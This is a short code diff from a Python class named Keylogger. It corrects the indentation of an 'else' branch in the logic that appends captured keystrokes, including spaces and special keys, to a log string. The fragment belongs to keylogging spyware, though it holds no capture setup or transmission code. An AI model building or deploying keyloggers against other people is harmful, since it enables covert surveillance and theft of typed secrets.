@@ -19,7 +19,7 @@ class Keylogger: #class names start with capital letter conventionally
         except AttributeError: #AttributeError triggered if special char is used (Space, etc)
             if key == key.space:
                 log = log + " " #print space rather than Key.space
-             else:
+            else:
                 log = log + " " + str(key) + " " #add space in between
     #print(key)
     #print(key.char)
